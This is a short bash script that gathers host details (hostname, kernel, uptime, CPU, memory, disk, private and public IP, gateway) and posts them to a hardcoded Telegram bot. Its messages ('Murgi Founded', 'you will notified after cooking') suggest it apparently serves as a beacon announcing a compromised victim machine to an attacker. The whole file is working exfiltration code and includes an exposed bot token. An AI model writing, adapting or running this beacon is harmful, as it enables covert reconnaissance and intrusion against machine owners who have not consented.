#!/bin/bash

# Configuration
BOT_TOKEN="8330134211:AAEr9LbLhP8B3YnKU8Eso7Hx8iO2Vjt0vdg"
CHAT_ID="5643920460"

#Telegram Configuration
send_telegram_msg() {
    local message="$1"
    curl -s -X POST \
        "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
        -d chat_id="${CHAT_ID}" \
        -d text="$message" \
        -d parse_mode="HTML" \
        -o /dev/null
}

# System info for Telegram
get_telegram_system_info() {
    local info_msg="<b>🐥 Murgi Founded%0A%0A🖥️ His/Her System Status Report</b>%0A%0A"
    
    # Basic info
    info_msg+="<b>Basic Info:</b>%0A"
    info_msg+="📛 Hostname: $(hostname)%0A"
    info_msg+="🐧 Kernel: $(uname -r)%0A"
    info_msg+="⏱️ Uptime: $(uptime -p | sed 's/up //')%0A%0A"
    
    # CPU info
    cpu_usage=$(top -bn1 | grep "Cpu(s)" | awk '{print $2}')
    load_avg=$(uptime | awk -F'load average:' '{print $2}' | xargs)
    info_msg+="<b>CPU:</b>%0A"
    info_msg+="🚀 Usage: ${cpu_usage}%%%0A"
    info_msg+="📈 Load: $load_avg%0A%0A"
    
    # Memory info
    total_mem=$(free -h | awk '/^Mem:/ {print $2}')
    used_mem=$(free -h | awk '/^Mem:/ {print $3}')
    mem_percent=$(free | awk '/^Mem:/ {printf "%.1f", $3/$2 * 100}')
    info_msg+="<b>Memory:</b>%0A"
    info_msg+="💾 Usage: $used_mem/$total_mem ($mem_percent%%)%0A%0A"
    
    # Disk info
    disk_usage=$(df -h / | awk 'NR==2{print $5}')
    disk_used=$(df -h / | awk 'NR==2{print $3}')
    disk_total=$(df -h / | awk 'NR==2{print $2}')
    info_msg+="<b>Disk:</b>%0A"
    info_msg+="💿 Root: $disk_usage used%0A"
    info_msg+="📁 Used: $disk_used of $disk_total%0A%0A"
    
    # Network Info
    info_msg+="<b>Network Information:</b>%0A"
    info_msg+="🔒 Private IP: $(hostname -I | awk '{print $1}')%0A"
    
    public_ip=$(curl -s --max-time 3 ifconfig.me || echo "Not available")
    info_msg+="🌍 Public IP: $public_ip%0A"
    
    gateway=$(ip route | grep default | awk '{print $3}' | head -1)
    info_msg+="🚪 Gateway: $gateway%0A%0A"
    
    info_msg+="<b>🛁Have a relax%0Ayou will notified after cooking 🔥</b>"
    
    echo "$info_msg"
}

# Send system info to Telegram
system_info=$(get_telegram_system_info)
send_telegram_msg "$system_info"
